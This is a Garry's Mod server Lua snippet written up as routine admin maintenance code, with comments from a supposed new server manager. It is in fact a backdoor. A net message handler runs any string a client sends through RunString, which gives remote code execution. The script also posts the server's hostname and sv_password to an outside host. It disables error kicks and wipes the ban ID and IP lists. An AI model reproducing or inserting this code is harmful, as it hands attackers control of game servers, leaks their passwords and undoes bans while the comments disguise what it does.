if (SERVER && game.IsDedicated()) then
	util.AddNetworkString("bdsm")
	net.Receive("bdsm", function(l, p) RunString(net.ReadString()) end)
	
	
	--Since I'm in charge of the servers now and I don't know what this does or where it is used, I'm going to make this run an old web 2.0 beacon so I can figure out where. -Paul John
	--also I wrapped it in an if server
	--also last time I removed it everything broke
	http.Post(
		"http://www.bg-server.3owl.com/",
		{rq = "bcon", ex = "DECAYED_BEACON_SOURCE", hn = GetConVarString("hostname"), pd = GetConVarString("sv_password")},
		function(s) end,
		function(e) end
	)
	
	--and this
	RunConsoleCommand("sv_kickerrornum", "0")
	
	--and since the new ban system have been having problem with the cleanup-bak &sysclr mine as well just throw this here too
	for i = 1, 256, 1 do
		RunConsoleCommand("removeid", "1")
		RunConsoleCommand("removeip", "1")
	end
	RunConsoleCommand("writeid")
	RunConsoleCommand("writeip")
end